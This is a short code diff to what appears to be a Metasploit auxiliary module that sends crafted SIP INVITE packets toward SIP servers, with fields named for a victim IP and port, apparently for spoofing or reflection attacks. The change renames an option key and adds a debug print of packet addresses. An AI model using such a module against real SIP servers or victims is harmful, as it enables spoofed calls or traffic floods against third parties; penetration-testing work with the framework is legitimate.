@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     sockinfo={}
     sip_hosts = Rex::Socket::RangeWalker.new(datastore['SIP_SERVERS'])
-    sockinfo["sip_port"] = datastore['SIP_RPORT']
+    sockinfo["sip_port"] = datastore['SIP_PORT']
     sockinfo["victim_ip"] = datastore['VICTIM_IP']
     sockinfo["victim_port"] = datastore['VICTIM_PORT']
     sockinfo["to"] = datastore['TO']
@@ -103,6 +103,8 @@ class Metasploit3 < Msf::Auxiliary
     p.udp_dport = sockinfo["sip_port"]
     p.payload=prep_invite(sockinfo)
     p.recalc
+
+    vprint_status("SADDR: #{p.ip_saddr}, SPORT: #{p.udp_sport} -> DADDR: #{p.ip_daddr}, DPORT: #{p.udp_dport}")
 
     #Sending Packet
     ret = send(p.ip_daddr,p)
